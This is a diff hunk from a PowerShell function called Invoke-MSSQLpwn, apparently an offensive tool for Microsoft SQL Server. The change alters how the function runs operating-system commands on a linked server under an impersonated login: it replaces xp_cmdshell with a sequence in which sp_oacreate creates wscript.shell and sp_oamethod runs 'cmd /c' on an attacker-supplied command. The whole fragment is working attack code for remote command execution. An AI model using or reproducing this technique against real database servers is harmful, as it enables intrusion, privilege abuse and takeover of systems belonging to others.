@@ -304,7 +304,7 @@ Function Invoke-MSSQLpwn{
             $reader.Close()
 
             if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
-                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC xp_cmdshell ''''{2}'''';'')' -f $Link,$LinkImpersonate,$Command
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';DECLARE @myshell INT; EXEC sp_oacreate ''''wscript.shell'''', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''''run'''', null, ''''cmd /c "{2}"'''';'')' -f $Link,$LinkImpersonate,$Command
             }else {
                 $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;DECLARE @myshell INT; EXEC sp_oacreate ''''wscript.shell'''', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''''run'''', null, ''''cmd /c "{1}"'''';'')' -f $Link,$Command
             }
